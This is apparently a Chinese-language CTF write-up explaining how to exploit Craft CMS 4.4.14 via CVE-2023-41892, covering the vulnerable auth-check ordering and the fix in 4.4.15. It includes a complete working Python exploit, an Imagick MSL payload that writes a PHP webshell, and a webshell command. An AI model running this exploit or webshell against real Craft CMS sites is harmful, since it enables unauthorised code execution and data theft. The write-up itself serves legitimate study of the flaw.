# craftcms

## 题目简述

题目部署了 Craft CMS 4.4.14，并在 PHP 环境中启用了 Imagick。目标是利用 Craft CMS 的未授权远程代码执行漏洞 CVE-2023-41892，在 Web 目录写入 PHP 文件，再执行具有 SUID 权限的 `/readflag` 读取 flag。

仓库中的镜像配置给出了两项与利用直接相关的条件：Apache 的站点根目录是 `/var/www/html/web`，其中 `cpresources` 目录可写；`/flag` 只有特权用户可读，但 `/readflag` 设置了 SUID 位。因此，拿到 Web 命令执行后不能直接读取 `/flag`，应执行 `/readflag`。

[Craft CMS 官方安全公告](https://github.com/craftcms/cms/security/advisories/GHSA-4w8r-3xrw-v25g)说明，CVE-2023-41892 影响 `4.0.0-RC1` 至 `4.4.14`，无需登录和用户交互即可利用，修复版本为 4.4.15。公告还建议已暴露的站点轮换 `CRAFT_SECURITY_KEY` 及其他私钥，因为漏洞可导致服务器与数据库中的敏感信息泄露。

## 解题过程

### 漏洞调用链

请求入口是 `POST /`，表单中的 `action=conditions/render` 会路由到 `ConditionsController::actionRender()`。在仓库所带的 4.4.14 源码中，控制器的 `beforeAction()` 按以下顺序工作：

1. 从 `config` 取出条件对象的参数名；
2. 从同名表单字段创建条件对象；
3. 调用 `Craft::configure()`，把 `config` 中剩余的键值逐项写入对象；
4. 最后才调用 `parent::beforeAction()` 做父控制器的访问检查。

问题就在第 3、4 步的先后顺序。即使父控制器最终拒绝请求，危险对象也已经创建完成，构造函数产生的副作用不会回滚。Yii 的 `Component::__set()` 还约定：属性名以 `as ` 开头时，其值会被当作 Behavior 配置交给 `Yii::createObject()`；依赖注入容器又支持用 `__construct()` 指定构造参数。因此下面的配置会在鉴权前实例化 `\Imagick`，并把 `vid:msl:/tmp/php*` 传入其构造函数：

```json
{
  "name": "test[userCondition]",
  "as xyz": {
    "class": "\\Imagick",
    "__construct()": ["vid:msl:/tmp/php*"]
  }
}
```

4.4.15 的修复把 `parent::beforeAction()` 和控制面板请求检查移到处理用户配置之前，所以外部链接里的“升级到 4.4.15”并非泛泛建议，而是直接切断了这条未授权对象创建链。

### 用 Imagick MSL 写入 WebShell

PHP 接收 multipart 上传时，会先把文件保存成 `/tmp/php*` 形式的临时文件。本题上传的文件内容不是普通图片，而是一段 ImageMagick 的 MSL（Magick Scripting Language）脚本：

```xml
<image>
  <read filename="caption:&lt;?php @system(@$_REQUEST['cmd']); ?&gt;" />
  <write filename="info:./cpresources/aaa.php" />
</image>
```

随后，受控的 Imagick 构造参数 `vid:msl:/tmp/php*` 匹配该临时文件并交给 MSL 解析器。脚本先生成包含 PHP 代码的内容，再通过 `info:` 输出到相对路径 `./cpresources/aaa.php`。该目录既位于 Apache 站点根目录下又被镜像设为可写，因此最终可以从 `/cpresources/aaa.php` 访问 WebShell。

触发 Imagick 时服务端可能在后续类型检查或渲染阶段返回 500，甚至主动断开连接；这不代表利用失败，因为写文件这一构造函数副作用已经发生。完整利用脚本如下：

```python
import sys

import requests


target = sys.argv[1].rstrip("/")

msl = r"""
<image>
  <read filename="caption:&lt;?php @system(@$_REQUEST['cmd']); ?&gt;" />
  <write filename="info:./cpresources/aaa.php" />
</image>
""".strip()

files = {
    "file": ("payload.msl", msl, "text/plain"),
}
data = {
    "action": "conditions/render",
    "test[userCondition]": (
        "craft\\elements\\conditions\\users\\UserCondition"
    ),
    "config": (
        '{"name":"test[userCondition]","as xyz":'
        '{"class":"\\\\Imagick",'
        '"__construct()\":["vid:msl:/tmp/php*"]}}'
    ),
}

try:
    requests.post(
        f"{target}/",
        data=data,
        files=files,
        timeout=10,
    )
except requests.RequestException:
    # 构造函数可能已经完成写文件，继续验证 WebShell。
    pass

response = requests.get(
    f"{target}/cpresources/aaa.php",
    params={"cmd": "/readflag"},
    timeout=10,
)
print(response.text)
```

运行方式为：

```bash
python3 exp.py http://TARGET
```

仓库说明还记录了一条非预期路线：如果利用同一对象创建入口取得本地文件包含能力，可包含 PHP 环境中的 `pearcmd.php`，再滥用 PEAR 的 `config-create` 写入带 PHP 代码的配置文件，完成从文件包含到命令执行的转换。这条路线依赖镜像内确实存在 PEAR 工具及可用的包含 gadget；本题已经提供稳定的 Imagick 与可写 Web 目录，预期的 MSL 路线更直接。

## 方法总结

本题的决定性问题是“鉴权发生在危险配置处理之后”。分析框架型漏洞时，不能只看控制器最终是否调用了权限检查，还要确认检查与对象创建、反序列化、模板渲染等有副作用操作的相对顺序。

利用链可概括为：未授权访问 `conditions/render` → `Craft::configure()` 写入 `as ...` 属性 → Yii 创建攻击者指定的 `Imagick` 对象 → `__construct()` 解析上传到 `/tmp` 的 MSL → 向可访问的 `cpresources` 写入 WebShell → 执行 SUID 程序 `/readflag`。其中 HTTP 错误响应只表示后续业务逻辑失败，不能否定此前已经发生的构造函数副作用。
